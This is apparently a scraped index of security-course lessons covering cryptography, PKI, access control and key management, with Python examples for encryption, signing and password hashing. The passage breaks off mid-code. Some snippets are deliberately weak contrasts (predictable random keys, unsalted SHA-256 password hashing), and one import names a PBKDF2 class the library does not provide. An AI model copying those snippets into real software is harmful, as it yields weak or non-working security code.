Cryptocurrency transactions SSL/TLS certificates Software updates Certificates and PKI Public Key Infrastructure (PKI) is the framework for managing public keys and digital certificates. Digital Certificates A certificate binds a public key to an identity. It contains: - Subject (who the certificate is for) - Public key - Issuer (who vouches for this) - Validity period - Digital signature from issuer Certificate Authority (CA) A CA is a trusted entity that issues certificates. Your browser trusts certain root CAs. Certificate chain: 1. Root CA (trusted by OS/browser) 2. Intermediate CA (issued by Root CA) 3. End entity certificate (issued by Intermediate CA) When you visit an HTTPS site: 1. Server sends its certificate 2. Browser checks if certificate is signed by trusted CA 3. Browser verifies certificate is valid (not expired, not revoked) 4. Browser uses public key from certificate to establish encrypted connection Security issues: - CAs have been compromised before - Malicious certificates can be issued - Certificate pinning helps (app only trusts specific certificates) Access Control Now let's talk about controlling who can access what. Access control is about authentication (who are you?) and authorization (what can you do?). Authentication Factors Something you know: Password, PIN, security question Something you have: Phone, hardware token, smart card Something you are: Biometrics (fingerprint, face, iris) Somewhere you are: Geolocation Something you do: Behavioral patterns (typing rhythm) Multi-Factor Authentication (MFA) : Requires multiple factors. Much more secure than passwords alone. Example: Password (know) + Text code (have) + Fingerprint (are) Authentication Methods Password-Based: - Most common - Weakest when alone - Vulnerable to: brute force, dictionary attacks, phishing, keyloggers - Improvements: password managers, strong password policies, MFA Certificate-Based: - Uses digital certificates - Common in enterprise (smart cards) - SSH keys are similar concept - More secure than passwords Biometric: - Convenient but has issues - Can't change if compromised - False positives/negatives - Privacy concerns - Best as second factor, not only factor Token-Based: - Hardware tokens (YubiKey, RSA SecurID) - Software tokens (Google Authenticator, Authy) - One-time passwords (OTP) - Time-based OTP (TOTP) - code changes every 30 seconds SSO (Single Sign-On): - Authenticate once, access multiple services - Reduces password fatigue - Protocols: SAML, OAuth, OpenID Connect - Risk: compromise of SSO = compromise of everything Authorization Models DAC (Discretionary Access Control): - Owner controls access to their resources - Common in operating systems (file permissions) - Flexible but hard to manage at scale MAC (Mandatory Access Control): - System-enforced rules - Users can't change permissions - Used in high-security environments (military, classified systems) - Example: SELinux RBAC (Role-Based Access Control): - Permissions assigned to roles, users assigned to roles - Easier to manage - Common in enterprises - Example: \"Admin\" role has all permissions, \"User\" role has read-only ABAC (Attribute-Based Access Control): - Access based on attributes (user attributes, resource attributes, environment) - Most flexible - Example: \"Allow access if user.department = 'Finance' AND time < 5PM AND location = 'Office'\" Principle of Least Privilege Give users only the minimum access needed to do their job. This limits damage from: - Compromised accounts - Insider threats - Accidents Implement through: - Proper RBAC - Regular access reviews - Just-in-time access (temporary elevation) - Separation of duties Key Management The security of encrypted data depends entirely on keeping keys secure. Key Generation Use cryptographically secure random number generators Never use weak or predictable keys Proper entropy (randomness) is critical Bad: import random key = random.randint(0, 1000000) # NOT SECURE! Good: import secrets key = secrets.token_bytes(32) # 256-bit secure random key Key Storage Never store keys in: - Source code - Configuration files (plain text) - Databases (unencrypted) - Environment variables (if avoidable) Better options: - Hardware Security Modules (HSM) - Key Management Services (KMS) - AWS KMS, Azure Key Vault - Operating system keystores (Windows DPAPI, macOS Keychain) - Encrypted key files with strong passphrases Key Rotation Regularly change encryption keys Limits damage if key is compromised Balance security vs. operational complexity Key Escrow and Recovery What if key is lost? Escrow: trusted third party holds backup key Recovery: mechanisms to regain access Trade-off: convenience vs. security vs. privacy Real-World Applications HTTPS/TLS What happens when you visit https://example.com: Client Hello : Browser sends supported cipher suites Server Hello : Server picks cipher suite, sends certificate Certificate Verification : Browser checks if certificate is valid Key Exchange : Browser and server agree on symmetric key (using RSA or ECDH) Encrypted Communication : All traffic encrypted with AES using agreed key This combines: - Asymmetric encryption (key exchange) - Symmetric encryption (data) - Hashing (integrity) - Digital signatures (authentication) VPN VPN creates encrypted tunnel through public networks: Client authenticates to VPN server (password, certificate) Key exchange establishes encryption keys All traffic encrypted and sent through tunnel VPN server decrypts and forwards to destination Response encrypted and sent back Protocols: OpenVPN, WireGuard, IPsec, SSTP End-to-End Encryption (E2EE) Messages encrypted on sender's device, decrypted only on recipient's device. Provider can't read messages. Signal Protocol (used by Signal, WhatsApp, etc.): - Each user has identity key pair (long-term) - Ephemeral keys for each conversation - Perfect forward secrecy (old messages safe even if keys compromised) - Ratcheting (keys constantly change) Disk Encryption Full-disk encryption protects data at rest: - BitLocker (Windows) - FileVault (macOS) - LUKS (Linux) Transparent to user, encryption happens automatically. Decryption key derived from password or TPM chip. Attacks on Cryptography Brute Force Try every possible key. Effectiveness depends on key length: - 56-bit DES: Breakable in hours - 128-bit AES: Impossible with current technology - 256-bit AES: Will remain secure for foreseeable future Dictionary Attacks Try common passwords/keys. Why password hashing should be slow and salted. Rainbow Tables Precomputed hashes for common passwords. Defeated by salting. Side-Channel Attacks Attack the implementation, not the algorithm: - Timing attacks : Measure how long operations take - Power analysis : Monitor power consumption during crypto operations - Acoustic cryptanalysis : Listen to sounds devices make - Cold boot attack : Read RAM after system powered off Cryptanalysis Mathematically analyzing algorithms for weaknesses. This is how MD5 and SHA-1 were broken. Social Engineering Why attack encryption when you can trick someone into giving you the key? Often the weakest link. Best Practices Use established algorithms : Don't create your own crypto Keep software updated : Vulnerabilities get patched Use appropriate key sizes : 2048-bit RSA minimum, 256-bit AES Implement properly : Easier said than done, use crypto libraries Protect keys : They're more important than encrypted data Use authenticated encryption : GCM mode, not ECB Salt and hash passwords : Use bcrypt, scrypt, or Argon2 Enable HTTPS : Everywhere, always Implement MFA : Passwords alone aren't enough Principle of least privilege : Minimize access The Future: Quantum Cryptography Quantum computers threaten current cryptography: - Can break RSA and ECC - Symmetric encryption requires larger keys but remains secure Post-quantum cryptography : Algorithms resistant to quantum computers - Lattice-based - Hash-based - Code-based - Multivariate NIST standardizing post-quantum algorithms now. Migration will take years. Quantum key distribution (QKD) : Uses quantum mechanics to detect eavesdropping. Theoretically unbreakable but limited by distance and cost. Conclusion Cryptography is the foundation of digital security. Everything we do online\u2014banking, shopping, communicating\u2014relies on cryptographic protections. Understanding these principles is essential for any security professional. The key insights: - Encryption transforms readable data into unreadable form - Symmetric encryption is fast but has key distribution challenges - Asymmetric encryption solves distribution but is slower - Hashing provides integrity and is used for passwords - Digital signatures provide authentication - Access control determines who can access what - Key management is critical\u2014keys are more valuable than data In the next lessons, we'll explore the ethical frameworks that guide how we use these powerful tools, and then dive into specific attack techniques and defenses. Remember: cryptography is a tool. Like any tool, it can be used for good or harm. The responsibility lies with those who wield it.","title":"Lesson 7.1"},{"location":"LECTURES/unit7/lesson7-1/#cryptography-and-access-control","text":"You've seen how easily data can be intercepted on networks. Now let's talk about how to protect it. Cryptography is the practice of securing information by transforming it into an unreadable format. It's the foundation of digital security\u2014from HTTPS to messaging apps to cryptocurrency.","title":"Cryptography and Access Control"},{"location":"LECTURES/unit7/lesson7-1/#what-is-cryptography","text":"Cryptography comes from Greek words meaning \"hidden writing.\" It's the science of using mathematical algorithms to: - Confidentiality : Keep data secret - Integrity : Ensure data hasn't been modified - Authentication : Verify identity - Non-repudiation : Prove actions can't be denied Without cryptography, the internet as we know it couldn't exist. Every secure transaction, every private message, every protected password relies on cryptographic principles.","title":"What is Cryptography?"},{"location":"LECTURES/unit7/lesson7-1/#the-basics-plaintext-and-ciphertext","text":"Plaintext : The original, readable data Ciphertext : The encrypted, unreadable data Encryption : Converting plaintext to ciphertext Decryption : Converting ciphertext back to plaintext Key : Secret value used in encryption/decryption Algorithm (Cipher) : The mathematical process for encryption The goal: without the key, ciphertext should be computationally infeasible to decrypt, even if you know the algorithm.","title":"The Basics: Plaintext and Ciphertext"},{"location":"LECTURES/unit7/lesson7-1/#symmetric-encryption","text":"Symmetric encryption uses the same key for both encryption and decryption. It's like a locked box\u2014the same key locks and unlocks it.","title":"Symmetric Encryption"},{"location":"LECTURES/unit7/lesson7-1/#how-it-works","text":"Plaintext \u2192 [Encryption Algorithm + Key] \u2192 Ciphertext Ciphertext \u2192 [Decryption Algorithm + Same Key] \u2192 Plaintext Advantages: - Fast and efficient - Simple to implement - Good for encrypting large amounts of data Disadvantage: - Key distribution problem: how do you securely share the key?","title":"How It Works"},{"location":"LECTURES/unit7/lesson7-1/#common-symmetric-algorithms","text":"AES (Advanced Encryption Standard): - Current industry standard - Key sizes: 128, 192, or 256 bits - Used everywhere: HTTPS, VPNs, disk encryption, file encryption - Extremely secure when properly implemented - Fast in both hardware and software DES (Data Encryption Standard): - Old standard from 1970s - 56-bit key (too small\u2014can be brute forced) - Deprecated, no longer secure - Historic importance only 3DES (Triple DES): - Applies DES three times with different keys - More secure than DES but slower - Being phased out in favor of AES ChaCha20: - Modern stream cipher - Alternative to AES - Fast on devices without AES hardware acceleration - Used in TLS, SSH, VPNs","title":"Common Symmetric Algorithms"},{"location":"LECTURES/unit7/lesson7-1/#block-vs-stream-ciphers","text":"Block ciphers (like AES): - Encrypt fixed-size blocks of data (128 bits for AES) - Need padding if data isn't a multiple of block size - Require modes of operation (ECB, CBC, CTR, GCM) Stream ciphers (like ChaCha20): - Encrypt data bit by bit or byte by byte - No padding needed - Often faster for streaming data","title":"Block vs. Stream Ciphers"},{"location":"LECTURES/unit7/lesson7-1/#modes-of-operation","text":"Block ciphers need a mode to handle multiple blocks: ECB (Electronic Codebook) - DON'T USE: - Each block encrypted independently - Same plaintext block = same ciphertext block - Patterns visible in encrypted data - Insecure for most purposes CBC (Cipher Block Chaining) : - Each block XORed with previous ciphertext - Requires initialization vector (IV) - Sequential processing - Common but being replaced CTR (Counter) : - Turns block cipher into stream cipher - Can be parallelized (faster) - Used in modern protocols GCM (Galois/Counter Mode) : - Provides encryption + authentication - Current best practice - Used in TLS 1.3, WPA3 - Fast and secure","title":"Modes of Operation"},{"location":"LECTURES/unit7/lesson7-1/#asymmetric-encryption-public-key-cryptography","text":"Asymmetric encryption uses two different keys: a public key (shared openly) and a private key (kept secret).","title":"Asymmetric Encryption (Public Key Cryptography)"},{"location":"LECTURES/unit7/lesson7-1/#how-it-works_1","text":"Plaintext \u2192 [Encryption + Public Key] \u2192 Ciphertext Ciphertext \u2192 [Decryption + Private Key] \u2192 Plaintext Anyone can encrypt with your public key, but only you can decrypt with your private key. Advantages: - Solves key distribution problem - Enables digital signatures - Foundation of secure communications Disadvantages: - Slower than symmetric encryption - More computationally intensive - Larger key sizes needed","title":"How It Works"},{"location":"LECTURES/unit7/lesson7-1/#common-asymmetric-algorithms","text":"RSA (Rivest-Shamir-Adleman): - Most widely used - Key sizes: 2048, 3072, 4096 bits (2048 minimum today) - Based on difficulty of factoring large numbers - Used for key exchange, digital signatures - Quantum computers threaten RSA's future ECC (Elliptic Curve Cryptography): - Smaller keys, same security as RSA - 256-bit ECC \u2248 3072-bit RSA - Faster and more efficient - Growing in popularity - Examples: ECDSA (signatures), ECDH (key exchange) Diffie-Hellman: - Key exchange protocol - Allows two parties to agree on shared secret over insecure channel - Doesn't encrypt data directly - Foundation of forward secrecy ElGamal: - Alternative to RSA - Used in PGP/GPG - Based on discrete logarithm problem","title":"Common Asymmetric Algorithms"},{"location":"LECTURES/unit7/lesson7-1/#hybrid-cryptography","text":"In practice, we use both symmetric and asymmetric: Use asymmetric encryption to exchange a symmetric key Use symmetric encryption for actual data (faster) This is how HTTPS, VPNs, and encrypted messaging work Example TLS handshake: 1. Client and server use RSA or ECDH to agree on a symmetric key 2. All subsequent traffic encrypted with AES using that key 3. Best of both worlds: secure key exchange + fast encryption","title":"Hybrid Cryptography"},{"location":"LECTURES/unit7/lesson7-1/#hash-functions","text":"Hash functions are one-way cryptographic operations that produce a fixed-size output (hash/digest) from any input.","title":"Hash Functions"},{"location":"LECTURES/unit7/lesson7-1/#properties-of-cryptographic-hashes","text":"Deterministic : Same input always produces same output Fast : Quick to compute One-way : Computationally infeasible to reverse Avalanche effect : Small input change drastically changes output Collision resistant : Hard to find two inputs with same hash","title":"Properties of Cryptographic Hashes"},{"location":"LECTURES/unit7/lesson7-1/#common-hash-functions","text":"MD5 (Message Digest 5): - 128-bit hash - BROKEN - collision attacks practical - Still seen but DO NOT USE for security - OK for checksums only SHA-1 (Secure Hash Algorithm 1): - 160-bit hash - BROKEN - collision attacks demonstrated (2017) - Being phased out everywhere - Don't use for new projects SHA-2 Family (SHA-224, SHA-256, SHA-384, SHA-512): - Current standard - SHA-256 most common (256-bit hash) - Very secure - Used in TLS, Bitcoin, code signing SHA-3: - Latest standard - Different algorithm than SHA-2 - Not widely adopted yet but available - Insurance against SHA-2 vulnerabilities BLAKE2: - Fast alternative to SHA-2 - As secure as SHA-3 - Used in some modern systems","title":"Common Hash Functions"},{"location":"LECTURES/unit7/lesson7-1/#uses-of-hash-functions","text":"Password Storage: Never store passwords in plaintext. Hash them: import hashlib password = \"user_password123\" hash_obj = hashlib.sha256(password.encode()) stored_hash = hash_obj.hexdigest() # Store: stored_hash in database To verify login: login_attempt = \"user_password123\" attempt_hash = hashlib.sha256(login_attempt.encode()).hexdigest() if attempt_hash == stored_hash: print(\"Login successful\") But simple hashing isn't enough! Attackers use rainbow tables (precomputed hashes). Salt : Random data added to password before hashing: import os import hashlib salt = os.urandom(32) # Random 32 bytes password = \"user_password123\" hash_input = salt + password.encode() password_hash = hashlib.sha256(hash_input).hexdigest() # Store both salt and hash # Each user gets unique salt, so same password \u2192 different hashes Even better : Use specialized password hashing algorithms: - bcrypt : Deliberately slow, has built-in salt - scrypt : Memory-hard (resists specialized hardware) - Argon2 : Winner of password hashing competition, current best practice File Integrity: Hash files to detect tampering: sha256sum file.txt # Output: hash value that uniquely identifies file contents Digital Signatures: Hash the message, encrypt hash with private key = signature Blockchain/Cryptocurrency: Each block contains hash of previous block, creating immutable chain","title":"Uses of Hash Functions"},{"location":"LECTURES/unit7/lesson7-1/#digital-signatures","text":"Digital signatures prove authenticity and integrity using asymmetric cryptography.","title":"Digital Signatures"},{"location":"LECTURES/unit7/lesson7-1/#how-they-work","text":"Signing: 1. Hash the document 2. Encrypt hash with sender's private key 3. This encrypted hash is the signature Verifying: 1. Hash the received document 2. Decrypt signature with sender's public key 3. Compare: if hashes match, signature valid What this proves: - Authenticity : Only holder of private key could create this signature - Integrity : If document changed, hash won't match - Non-repudiation : Signer can't deny signing","title":"How They Work"},{"location":"LECTURES/unit7/lesson7-1/#uses","text":"Code signing (verify software hasn't been tampered) Email signatures (PGP/GPG) Legal documents Cryptocurrency transactions SSL/TLS certificates Software updates","title":"Uses"},{"location":"LECTURES/unit7/lesson7-1/#certificates-and-pki","text":"Public Key Infrastructure (PKI) is the framework for managing public keys and digital certificates.","title":"Certificates and PKI"},{"location":"LECTURES/unit7/lesson7-1/#digital-certificates","text":"A certificate binds a public key to an identity. It contains: - Subject (who the certificate is for) - Public key - Issuer (who vouches for this) - Validity period - Digital signature from issuer","title":"Digital Certificates"},{"location":"LECTURES/unit7/lesson7-1/#certificate-authority-ca","text":"A CA is a trusted entity that issues certificates. Your browser trusts certain root CAs. Certificate chain: 1. Root CA (trusted by OS/browser) 2. Intermediate CA (issued by Root CA) 3. End entity certificate (issued by Intermediate CA) When you visit an HTTPS site: 1. Server sends its certificate 2. Browser checks if certificate is signed by trusted CA 3. Browser verifies certificate is valid (not expired, not revoked) 4. Browser uses public key from certificate to establish encrypted connection Security issues: - CAs have been compromised before - Malicious certificates can be issued - Certificate pinning helps (app only trusts specific certificates)","title":"Certificate Authority (CA)"},{"location":"LECTURES/unit7/lesson7-1/#access-control","text":"Now let's talk about controlling who can access what. Access control is about authentication (who are you?) and authorization (what can you do?).","title":"Access Control"},{"location":"LECTURES/unit7/lesson7-1/#authentication-factors","text":"Something you know: Password, PIN, security question Something you have: Phone, hardware token, smart card Something you are: Biometrics (fingerprint, face, iris) Somewhere you are: Geolocation Something you do: Behavioral patterns (typing rhythm) Multi-Factor Authentication (MFA) : Requires multiple factors. Much more secure than passwords alone. Example: Password (know) + Text code (have) + Fingerprint (are)","title":"Authentication Factors"},{"location":"LECTURES/unit7/lesson7-1/#authentication-methods","text":"Password-Based: - Most common - Weakest when alone - Vulnerable to: brute force, dictionary attacks, phishing, keyloggers - Improvements: password managers, strong password policies, MFA Certificate-Based: - Uses digital certificates - Common in enterprise (smart cards) - SSH keys are similar concept - More secure than passwords Biometric: - Convenient but has issues - Can't change if compromised - False positives/negatives - Privacy concerns - Best as second factor, not only factor Token-Based: - Hardware tokens (YubiKey, RSA SecurID) - Software tokens (Google Authenticator, Authy) - One-time passwords (OTP) - Time-based OTP (TOTP) - code changes every 30 seconds SSO (Single Sign-On): - Authenticate once, access multiple services - Reduces password fatigue - Protocols: SAML, OAuth, OpenID Connect - Risk: compromise of SSO = compromise of everything","title":"Authentication Methods"},{"location":"LECTURES/unit7/lesson7-1/#authorization-models","text":"DAC (Discretionary Access Control): - Owner controls access to their resources - Common in operating systems (file permissions) - Flexible but hard to manage at scale MAC (Mandatory Access Control): - System-enforced rules - Users can't change permissions - Used in high-security environments (military, classified systems) - Example: SELinux RBAC (Role-Based Access Control): - Permissions assigned to roles, users assigned to roles - Easier to manage - Common in enterprises - Example: \"Admin\" role has all permissions, \"User\" role has read-only ABAC (Attribute-Based Access Control): - Access based on attributes (user attributes, resource attributes, environment) - Most flexible - Example: \"Allow access if user.department = 'Finance' AND time < 5PM AND location = 'Office'\"","title":"Authorization Models"},{"location":"LECTURES/unit7/lesson7-1/#principle-of-least-privilege","text":"Give users only the minimum access needed to do their job. This limits damage from: - Compromised accounts - Insider threats - Accidents Implement through: - Proper RBAC - Regular access reviews - Just-in-time access (temporary elevation) - Separation of duties","title":"Principle of Least Privilege"},{"location":"LECTURES/unit7/lesson7-1/#key-management","text":"The security of encrypted data depends entirely on keeping keys secure.","title":"Key Management"},{"location":"LECTURES/unit7/lesson7-1/#key-generation","text":"Use cryptographically secure random number generators Never use weak or predictable keys Proper entropy (randomness) is critical Bad: import random key = random.randint(0, 1000000) # NOT SECURE! Good: import secrets key = secrets.token_bytes(32) # 256-bit secure random key","title":"Key Generation"},{"location":"LECTURES/unit7/lesson7-1/#key-storage","text":"Never store keys in: - Source code - Configuration files (plain text) - Databases (unencrypted) - Environment variables (if avoidable) Better options: - Hardware Security Modules (HSM) - Key Management Services (KMS) - AWS KMS, Azure Key Vault - Operating system keystores (Windows DPAPI, macOS Keychain) - Encrypted key files with strong passphrases","title":"Key Storage"},{"location":"LECTURES/unit7/lesson7-1/#key-rotation","text":"Regularly change encryption keys Limits damage if key is compromised Balance security vs. operational complexity","title":"Key Rotation"},{"location":"LECTURES/unit7/lesson7-1/#key-escrow-and-recovery","text":"What if key is lost? Escrow: trusted third party holds backup key Recovery: mechanisms to regain access Trade-off: convenience vs. security vs. privacy","title":"Key Escrow and Recovery"},{"location":"LECTURES/unit7/lesson7-1/#real-world-applications","text":"","title":"Real-World Applications"},{"location":"LECTURES/unit7/lesson7-1/#httpstls","text":"What happens when you visit https://example.com: Client Hello : Browser sends supported cipher suites Server Hello : Server picks cipher suite, sends certificate Certificate Verification : Browser checks if certificate is valid Key Exchange : Browser and server agree on symmetric key (using RSA or ECDH) Encrypted Communication : All traffic encrypted with AES using agreed key This combines: - Asymmetric encryption (key exchange) - Symmetric encryption (data) - Hashing (integrity) - Digital signatures (authentication)","title":"HTTPS/TLS"},{"location":"LECTURES/unit7/lesson7-1/#vpn","text":"VPN creates encrypted tunnel through public networks: Client authenticates to VPN server (password, certificate) Key exchange establishes encryption keys All traffic encrypted and sent through tunnel VPN server decrypts and forwards to destination Response encrypted and sent back Protocols: OpenVPN, WireGuard, IPsec, SSTP","title":"VPN"},{"location":"LECTURES/unit7/lesson7-1/#end-to-end-encryption-e2ee","text":"Messages encrypted on sender's device, decrypted only on recipient's device. Provider can't read messages. Signal Protocol (used by Signal, WhatsApp, etc.): - Each user has identity key pair (long-term) - Ephemeral keys for each conversation - Perfect forward secrecy (old messages safe even if keys compromised) - Ratcheting (keys constantly change)","title":"End-to-End Encryption (E2EE)"},{"location":"LECTURES/unit7/lesson7-1/#disk-encryption","text":"Full-disk encryption protects data at rest: - BitLocker (Windows) - FileVault (macOS) - LUKS (Linux) Transparent to user, encryption happens automatically. Decryption key derived from password or TPM chip.","title":"Disk Encryption"},{"location":"LECTURES/unit7/lesson7-1/#attacks-on-cryptography","text":"","title":"Attacks on Cryptography"},{"location":"LECTURES/unit7/lesson7-1/#brute-force","text":"Try every possible key. Effectiveness depends on key length: - 56-bit DES: Breakable in hours - 128-bit AES: Impossible with current technology - 256-bit AES: Will remain secure for foreseeable future","title":"Brute Force"},{"location":"LECTURES/unit7/lesson7-1/#dictionary-attacks","text":"Try common passwords/keys. Why password hashing should be slow and salted.","title":"Dictionary Attacks"},{"location":"LECTURES/unit7/lesson7-1/#rainbow-tables","text":"Precomputed hashes for common passwords. Defeated by salting.","title":"Rainbow Tables"},{"location":"LECTURES/unit7/lesson7-1/#side-channel-attacks","text":"Attack the implementation, not the algorithm: - Timing attacks : Measure how long operations take - Power analysis : Monitor power consumption during crypto operations - Acoustic cryptanalysis : Listen to sounds devices make - Cold boot attack : Read RAM after system powered off","title":"Side-Channel Attacks"},{"location":"LECTURES/unit7/lesson7-1/#cryptanalysis","text":"Mathematically analyzing algorithms for weaknesses. This is how MD5 and SHA-1 were broken.","title":"Cryptanalysis"},{"location":"LECTURES/unit7/lesson7-1/#social-engineering","text":"Why attack encryption when you can trick someone into giving you the key? Often the weakest link.","title":"Social Engineering"},{"location":"LECTURES/unit7/lesson7-1/#best-practices","text":"Use established algorithms : Don't create your own crypto Keep software updated : Vulnerabilities get patched Use appropriate key sizes : 2048-bit RSA minimum, 256-bit AES Implement properly : Easier said than done, use crypto libraries Protect keys : They're more important than encrypted data Use authenticated encryption : GCM mode, not ECB Salt and hash passwords : Use bcrypt, scrypt, or Argon2 Enable HTTPS : Everywhere, always Implement MFA : Passwords alone aren't enough Principle of least privilege : Minimize access","title":"Best Practices"},{"location":"LECTURES/unit7/lesson7-1/#the-future-quantum-cryptography","text":"Quantum computers threaten current cryptography: - Can break RSA and ECC - Symmetric encryption requires larger keys but remains secure Post-quantum cryptography : Algorithms resistant to quantum computers - Lattice-based - Hash-based - Code-based - Multivariate NIST standardizing post-quantum algorithms now. Migration will take years. Quantum key distribution (QKD) : Uses quantum mechanics to detect eavesdropping. Theoretically unbreakable but limited by distance and cost.","title":"The Future: Quantum Cryptography"},{"location":"LECTURES/unit7/lesson7-1/#conclusion","text":"Cryptography is the foundation of digital security. Everything we do online\u2014banking, shopping, communicating\u2014relies on cryptographic protections. Understanding these principles is essential for any security professional. The key insights: - Encryption transforms readable data into unreadable form - Symmetric encryption is fast but has key distribution challenges - Asymmetric encryption solves distribution but is slower - Hashing provides integrity and is used for passwords - Digital signatures provide authentication - Access control determines who can access what - Key management is critical\u2014keys are more valuable than data In the next lessons, we'll explore the ethical frameworks that guide how we use these powerful tools, and then dive into specific attack techniques and defenses. Remember: cryptography is a tool. Like any tool, it can be used for good or harm. The responsibility lies with those who wield it.","title":"Conclusion"},{"location":"LECTURES/unit7/lesson7-2/","text":"Applied Cryptography and Real-World Implementations Cryptography theory is one thing\u2014implementing it correctly is another. This lesson covers how to actually use cryptography in real applications, common pitfalls, and best practices for secure implementation. Implementing Encryption in Applications Python Cryptography Use the cryptography library\u2014don't roll your own crypto! Symmetric Encryption (AES) from cryptography.fernet import Fernet # Generate key key = Fernet.generate_key() print(f\"Key (save this securely): {key.decode()}\") # Create cipher object cipher = Fernet(key) # Encrypt plaintext = b\"Secret message\" ciphertext = cipher.encrypt(plaintext) print(f\"Encrypted: {ciphertext}\") # Decrypt decrypted = cipher.decrypt(ciphertext) print(f\"Decrypted: {decrypted.decode()}\") Fernet provides: - AES-128 encryption in CBC mode - HMAC for authentication - Timestamp for freshness - All-in-one authenticated encryption File Encryption from cryptography.fernet import Fernet import os def encrypt_file(filename, key): \"\"\"Encrypt a file\"\"\" cipher = Fernet(key) # Read file with open(filename, 'rb') as f: data = f.read() # Encrypt encrypted = cipher.encrypt(data) # Write encrypted file with open(filename + '.enc', 'wb') as f: f.write(encrypted) print(f\"Encrypted {filename} -> {filename}.enc\") def decrypt_file(filename, key): \"\"\"Decrypt a file\"\"\" cipher = Fernet(key) # Read encrypted file with open(filename, 'rb') as f: encrypted = f.read() # Decrypt try: decrypted = cipher.decrypt(encrypted) except: print(\"Decryption failed - wrong key or corrupted file\") return # Write decrypted file output = filename.replace('.enc', '.dec') with open(output, 'wb') as f: f.write(decrypted) print(f\"Decrypted {filename} -> {output}\") # Usage key = Fernet.generate_key() encrypt_file('secret.txt', key) decrypt_file('secret.txt.enc', key) Password-Based Encryption from cryptography.hazmat.primitives import hashes from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2 from cryptography.fernet import Fernet import base64 import os def derive_key_from_password(password, salt=None): \"\"\"Derive encryption key from password\"\"\" if salt is None: salt = os.urandom(16) kdf = PBKDF2( algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, ) key = base64.urlsafe_b64encode(kdf.derive(password.encode())) return key, salt def encrypt_with_password(data, password): \"\"\"Encrypt data with password\"\"\" key, salt = derive_key_from_password(password) cipher = Fernet(key) encrypted = cipher.encrypt(data.encode()) # Return salt + encrypted data return salt + encrypted def decrypt_with_password(encrypted_data, password): \"\"\"Decrypt data with password\"\"\" # Extract salt and encrypted data salt = encrypted_data[:16] encrypted = encrypted_data[16:] # Derive key from password and salt key, _ = derive_key_from_password(password, salt) cipher = Fernet(key) # Decrypt decrypted = cipher.decrypt(encrypted) return decrypted.decode() # Usage password = \"my_secure_password\" data = \"Secret information\" encrypted = encrypt_with_password(data, password) print(f\"Encrypted: {encrypted.hex()}\") decrypted = decrypt_with_password(encrypted, password) print(f\"Decrypted: {decrypted}\") Asymmetric Encryption (RSA) from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes, serialization # Generate RSA key pair private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) public_key = private_key.public_key() # Save private key pem_private = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.BestAvailableEncryption(b'password') ) with open('private_key.pem', 'wb') as f: f.write(pem_private) # Save public key pem_public = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) with open('public_key.pem', 'wb') as f: f.write(pem_public) # Encrypt with public key message = b\"Secret message\" ciphertext = public_key.encrypt( message, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Decrypt with private key plaintext = private_key.decrypt( ciphertext, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) print(f\"Decrypted: {plaintext.decode()}\") Note: RSA encryption is limited by key size: - 2048-bit key can encrypt ~245 bytes - For larger data, encrypt a symmetric key with RSA - Then encrypt data with symmetric key (hybrid encryption) Digital Signatures from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes # Generate key pair private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) public_key = private_key.public_key() # Sign a message message = b\"I agree to the terms\" signature = private_key.sign( message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(f\"Signature: {signature.hex()}\") # Verify signature try: public_key.verify( signature, message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) print(\"Signature valid!\") except: print(\"Signature invalid!\") Password Storage NEVER store passwords in plaintext! Hashing Passwords import bcrypt def hash_password(password): \"\"\"Hash password with bcrypt\"\"\" # Generate salt and hash salt = bcrypt.gensalt(rounds=12) # Work factor: 2^12 iterations hashed = bcrypt.hashpw(password.encode(), salt) return hashed def verify_password(password, hashed): \"\"\"Verify password against hash\"\"\" return bcrypt.checkpw(password.encode(), hashed) # Registration password = \"user_password123\" stored_hash = hash_password(password) print(f\"Stored hash: {stored_hash}\") # Login login_password = \"user_password123\" if verify_password(login_password, stored_hash): print(\"Login successful!\") else: print(\"Invalid password\") Using Argon2 (More Secure) from argon2 import PasswordHasher ph = PasswordHasher() def hash_password_argon2(password): \"\"\"Hash password with Argon2\"\"\" return ph.hash(password) def verify_password_argon2(password, hashed): \"\"\"Verify password against Argon2 hash\"\"\" try: ph.verify(hashed, password) return True except: return False # Usage password = \"secure_password\" hashed = hash_password_argon2(password) print(f\"Argon2 hash: {hashed}\") # Verification if verify_password_argon2(\"secure_password\", hashed): print(\"Password correct!\") Secure Communication Creating a Secure Messaging System from cryptography.hazmat.primitives.asymmetric import rsa, padding from cryptography.hazmat.primitives import hashes, serialization from cryptography.fernet import Fernet class SecureMessaging: def __init__(self): # Generate RSA key pair self.private_key = rsa.generate_private_key( public_exponent=65537, key_size=2048, ) self.public_key = self.private_key.public_key() def get_public_key(self): \"\"\"Export public key for sharing\"\"\" return self.public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) def send_message(self, message, recipient_public_key_pem): \"\"\"Encrypt message for recipient\"\"\" # Generate random symmetric key symmetric_key = Fernet.generate_key() cipher = Fernet(symmetric_key) # Encrypt message with symmetric key encrypted_message = cipher.encrypt(message.encode()) # Load recipient's public key recipient_public_key = serialization.load_pem_public_key( recipient_public_key_pem ) # Encrypt symmetric key with recipient's public key encrypted_key = recipient_public_key.encrypt( symmetric_key, padding.OAEP( mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None ) ) # Sign message signature = self.private_key.sign( encrypted_message, padding.PSS( mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH ), hashes.SHA256() ) return { 'encrypted_key': encrypted_key, 'encrypted_message': 